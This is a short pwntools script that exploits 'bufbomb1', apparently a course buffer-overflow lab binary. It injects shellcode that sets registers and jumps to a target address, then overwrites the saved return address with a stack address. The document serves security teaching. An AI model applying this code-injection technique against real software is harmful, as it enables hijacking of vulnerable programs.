from pwn import *

elf = ELF("./bufbomb1")
context.arch = 'i386'
p = elf.process(['-u20081831'])
raw_input("DEBUG")

shellcode = asm('''
    mov  eax, 0x1d3f84b5
    mov  ebp, 0x55683ae0
    push 0x80044317
    ret
''')
print(shellcode)
payload = shellcode
payload += b"A" * (44-len(shellcode))
payload += p32(0x55683578)

p.sendline(payload)
p.interactive()
